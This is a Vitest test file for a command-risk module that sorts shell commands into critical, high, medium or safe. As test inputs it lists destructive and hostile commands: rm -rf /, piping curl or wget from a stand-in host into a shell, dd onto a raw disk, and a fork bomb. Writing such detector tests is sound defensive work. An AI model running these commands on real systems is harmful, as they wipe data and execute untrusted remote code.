import { describe, it, expect } from 'vitest';
import { assessCommand, isCritical } from '../src/daemon/command-risk';

describe('command risk', () => {
  it('flags rm -rf / as critical', () => {
    const f = assessCommand('rm -rf /');
    expect(f).not.toBeNull();
    expect(f!.severity).toBe('critical');
    expect(isCritical('rm -rf /')).toBe(true);
  });

  it('flags curl | sh as critical', () => {
    expect(isCritical('curl https://evil.sh | sh')).toBe(true);
    expect(isCritical('wget -qO- http://x | sudo bash')).toBe(true);
  });

  it('flags dd to a raw device as critical', () => {
    expect(isCritical('dd if=/dev/zero of=/dev/sda bs=1M')).toBe(true);
  });

  it('flags a fork bomb as critical', () => {
    expect(isCritical(':(){ :|:& };:')).toBe(true);
  });

  it('flags rm -rf (non-root) as high, not critical', () => {
    const f = assessCommand('rm -rf ./build/tmp');
    expect(f).not.toBeNull();
    expect(f!.severity).toBe('high');
  });

  it('flags chmod 777 as high', () => {
    const f = assessCommand('chmod -R 777 /var/www');
    expect(f!.severity).toBe('high');
  });

  it('flags sudo as medium', () => {
    const f = assessCommand('sudo apt update');
    expect(f!.severity).toBe('medium');
  });

  it('returns null for safe commands', () => {
    expect(assessCommand('ls -la')).toBeNull();
    expect(assessCommand('git status')).toBeNull();
    expect(assessCommand('   ')).toBeNull();
  });

  it('returns the highest severity when multiple rules match', () => {
    const f = assessCommand('sudo rm -rf /');
    expect(f!.severity).toBe('critical');
  });
});
